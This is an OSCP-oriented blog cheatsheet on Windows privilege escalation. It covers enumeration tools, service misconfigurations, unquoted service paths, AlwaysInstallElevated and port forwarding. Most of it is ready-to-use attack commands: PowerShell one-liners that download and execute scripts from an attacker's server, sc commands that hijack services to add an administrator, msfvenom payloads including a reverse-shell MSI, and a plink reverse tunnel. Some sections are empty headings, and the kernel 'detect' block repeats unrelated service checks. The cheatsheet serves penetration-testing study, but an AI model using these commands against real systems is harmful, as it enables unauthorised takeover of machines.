---
layout: post
title: Windows PrivEsc cheatsheet
tags: [OSCP, Cheatsheet, Windows]
description: "Windows PrivEsc cheatsheet"
---

# Table of contents

- [Introduction](#introduction)
- [Tools](#tools)
- [Kernel](#kernel)
- [Services](#services)
  - [BinPath](#binpath)
  - [Unquoted Service Path](#unquoted-service-path)
  - [Registry](#registry)
  - [Executable file](#executable-file)
  - [DLL Hijacking](#dll-hijacking)
- [Password mining](#password-mining)
  - [Passwords stored by user](#passwords-stored-by-user)
  - [Registry](#registry)
  - [Configuration Files](#configuration-files)
- [Registry](#registry)
  - [AutoRun](#autorun)
  - [AllwaysInstallElevated](#allwaysinstallelevated)
- [Scheduled Tasks](#scheduled-tasks)
- [Hot Potato](#hot-potato)
  - [Detect](#detect)
  - [Exploit](#exploit)
- [Startup Aplications](#startup-aplications)
- [Firewalled Services](#firewalled-services)

# Introduction
The goal of this cheat sheet is to provide a quick overview of possible attack vectors that can be used to elevate your privileges to the system. For each attack vector, it explains how to detect if a system is vulnerable and gives an example of how to exploit it.   

# Tools
Before learning about the different attack vectors, I listed some commands for the general privesc enumeration scripts that I used during OSCP. To gain some efficiency, I moved all the scripts into a directory and made them accessible remotely through the samba service or via the web.   
```
#host files in current directory through smb
impacket-smbserver share $(pwd)
impacket-smbserver -smb2support share $(pwd)   // for Windows 10

#host files in current directory through http
python -m SimpleHTTPServer 8080
python3 -m http.server 8080
```

Below, I listed the different PrivEsc tools and files that I would generally have hosted through the **SMB** and **HTTP** server for quick access.
```
accesschk64.exe
accesschk.exe
accesschk-XP.exe
Invoke-PowerShellTcp.ps1
PowerUp.ps1
SharpUp.exe
Sherlock.ps1
windows-exploit-suggester2.py
winPEASany.exe
winPEASx64.exe
winPEASx86.exe
winbin/ #a copy of windows binaries in /usr/share/windows-binaries/
    nc64.exe
    nc.exe
    plink.exe
    wget.exe
    whoami.exe
    chisel.exe
```

I used the following commands to launch the tools quickly without having to transfer them first on the target itself.  
```
#WinPEAS - I love this tool
//192.168.194.141/share/winPEASx64.exe searchall cmd
#PowerUp
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.73:1234/PowerUp.ps1'); Invoke-AllChecks"
#Sherlock
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.194.141:1234/Sherlock.ps1'); Find-AllVulns"
```

# Kernel
Missing patches are probably the easiest way to improve your privileges. However, this can make your target system unstable, so only use them when you are desperate, I recommend taking this route as a last resort as there are times when the system can corrupt and lead to problems when hacking the machine.  


**Detect if vulnerable:** Get patchlevel and check for exploits  
```
#Check for what services we have write access by specifying one of our user roles (also check for the power users group)
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

#Check our permissions for one specific service
accesschk.exe -ucqv daclsvc

#Check under what privileges a system runs
sc qc daclsvc
```

Exploit - Always used a public exploit and never waste time compiling your own kernel exploits. You can find a list of precompiled exploits here:   
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)    

# Services
When elevating our privileges through the services on a Windows machine, we search for services that run under system privileges and that we can manipulate in such a way that when the service restarts, our exploit is executed.

## BinPath
Each Windows service specifies the location of the executable that has to be executed through the configuration variable 'BinPath'. If we can change the BinPath variable to the location of our payload and make it run under LocalSystem privileges, we are in.   
**How to detect vulnerable services:** You are looking for services that you have write access to. This way you can adjust the binary path of the executable that is normally executed to the location of your exploit.   
```
# Check for what services we have write access by specifying one of our user roles (also check for the power users group)
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

# Check our permissions for one specific service
accesschk.exe -ucqv daclsvc

# Check under what privileges a system runs
sc qc daclsvc
```   
You basically need one of the following permissions to the service and then you're good to go:   

| Permission            | Why good for us?                                              |
| --------------------- | ------------------------------------------------------------- |
| SERVICE_CHANGE_CONFIG | Can reconfigure the service binary                            |
| WRITE_DAC             | Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG |
| WRITE_OWNER           | Can become owner, reconfigure permissions                     |
| GENERIC_WRITE         | Inherits SERVICE_CHANGE_CONFIG                                |
| GENERIC_ALL           | Inherits SERVICE_CHANGE_CONFIG                                |   


> To elevate privileges the BinPath way, services don't have to be configured to run under LocalSystem. As we can alter the configuration, we can also specify under what privileges it should run.   

#### Exploit  
```
# Change the privileges to LocalSystem if that is not yet the case
sc config daclsvc obj= ".\LocalSystem" password= ""

# add command in path
sc config daclsvc binpath= "net localgroup administrators xhack /add"

# restart service
sc start daclsvc

# verify if the user 'xhack' is succesfully added to the administrators group
net localgroup Administrator
```

## Unquoted Service Path
If the service binary path is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument. For example, if we have an executable in the following unquoted directory ```C:\Program Files\Unquoted Path Service\Common Files\uncsvc.exe```, then Windows will look for the executable consecutively in following paths:  
```
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\uncsvc.exe
```
If we can place our payload in one of previous locations and restart the service, our executable is run instead of the intended executable.   
**How to detect vulnerable services:** You're looking for services that meet the following three criteria:  
- The path of the binary location does not contain quotes.    
- Service runs under LocalSystem.   
- You have write access to one of the exploitable directories.   

```
# Check for services in which the executable paths don't contain quotes
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

# Do following checks for unquoted service paths:
#service runs under system (SERVICE_START_NAME: LocalSystem)
sc qc unquotedsvc

#extra verification if bin path is unquoted (BINARY_PATH_NAME)
sc qc unquotedsvc

#you have write access to one of these directories
icacls "C:\ "
icacls "C:\Program Files"
icacls "C:\Program Files\Unquoted Path Service"
```   

#### Exploit

```
#Choose the name of the exploit according to the paths the system will look for the binaries
#in our example below, we have write access to the "C:\Program Files\Unquoted Path Service\" directory
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

# Therefor we choose the name following binary name --> common.exe

#create exploit
msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o common.exe

#place exploit in the target folder, so in here
C:\Program Files\Unquoted Path Service\

#restart service
sc start unquotedsvc
```   

## Registry
## Executable File
## DLL Hijacking
# Password mining
Administrators are often lazy and use weak passwords or reuse them. When performing our password mining, we scout for (hashed) passwords that administrators maybe reused for their main account. Further these passwords could also get us access to other services like databases.   
#### Passwords stored by user
Sometimes users store their passwords in plain-text in an unsecured file. When we can find these passwords, it is a quick win for us.   

```
# Check for files in home folders of users with names that could mean they hold passwords
dir /s C:\Users
```   

## Passwords stored by user
## Registry
## Configuration Files
# Registry
## AutoRun
## AllwaysInstallElevated
When the AlwaysInstallElevated key is set for HKLM and HKCU in the registry, each newly installed program automatically gets system privileges. We just have to install our payload and we have **system**.    
#### detect vulnerability:   

```
# check if AlwaysInstallElevated key is set
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```   
##### Exploit
```
# Generate payload
msfvenom -p windows/reverse_shell_tcp LHOST=<ip attack> LPORT=<port> -f msi > shell.msi

# Install msi file
msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
```    

# Scheduled Tasks
# Hot Potato
## Detect
## Exploit
# Startup Aplications
#### Detect if vulnerable:
```
#Check if you have write permissions to startup folder
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```   
#### Exploit:
- Generate payload and place it in this folder.    
- restart the machine with Administrator credentials.   

# Firewalled Services
Some machines firewall several ports such that they are only accessible from the localhost. If we can execute code through services that are running as system, we can elevate our privileges to system.   
#### Detect for vulnerable services:
```
# Check what interfaces are only available to the localhost (compare to your nmap scan)
netstat -ano

# Check the executable from a specific service
tasklist /fi "pid eq <PID>"
```   
#### Exploit
For databases, you can gain RCE through the command functionality or find passwords in the database itself.   

When dealing with web apps that are only accessible to the localhost, we can forward them to our kali machine:   
```
# On machine attack // example 10.10.10.12
# Start the SSH service
service ssh start

#place the plink.exe binary in the smb shared folder
# On the target
# Tunnel the traffic
//10.10.10.12/share/plink.exe root@10.10.10.12 -R 4000:127.0.0.1:80

# Here 10.11.0.79 is ip of machine attack
# 4000 is local port on kali to bind web app to
# 80 is local port on target that we want to forward

#on kali
# Go in the browser to following url and you should see the forwarded web app
http://localhost:4000    
```   
